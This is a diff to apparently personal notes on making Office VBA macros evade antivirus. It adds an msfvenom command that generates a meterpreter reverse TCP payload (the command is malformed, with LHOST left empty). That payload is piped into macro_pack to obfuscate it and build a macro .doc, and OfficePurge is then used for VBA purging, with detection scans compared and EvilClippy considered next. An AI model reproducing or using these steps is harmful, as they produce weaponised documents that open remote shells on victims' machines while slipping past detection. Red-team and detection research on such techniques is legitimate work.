@@ -444,7 +444,8 @@ https://github.com/EgeBalci
 
 1. try macropack
 2. vba macro obfuscation
-3. vba script obfuscation
+3. vba script stomping 
+4. vba script purging
 
 clarity over concepts?
 
@@ -452,7 +453,29 @@ https://github.com/mandiant/OfficePurge
 
 vba stomping than purging
 
+trying a quick poc with msfvenom
 
+`msfvenom -p windows/meterpreter/reverse_tcp LHOST=-f vb -f vba | macro_pack.exe -o -G meterobf.vba`
+
+then after downloading
+
+`"macro_pack (1).exe" -f empire.vba -o -G myDoc.doc`
+
+scan results
+
+![](2023-01-29-20-32-26.png)
+
+`OfficePurge.exe -d word -f .\myDoc.doc -m ThisDocument`
+
+![](2023-01-29-20-38-24.png)
+
+very limited detection change
+
+https://syedhasan010.medium.com/vba-purging-what-purpose-does-it-serve-1f3ff6c7fd01
+
+can we try evilclippy here
+
+https://github.com/outflanknl/EvilClippy
 
 
 
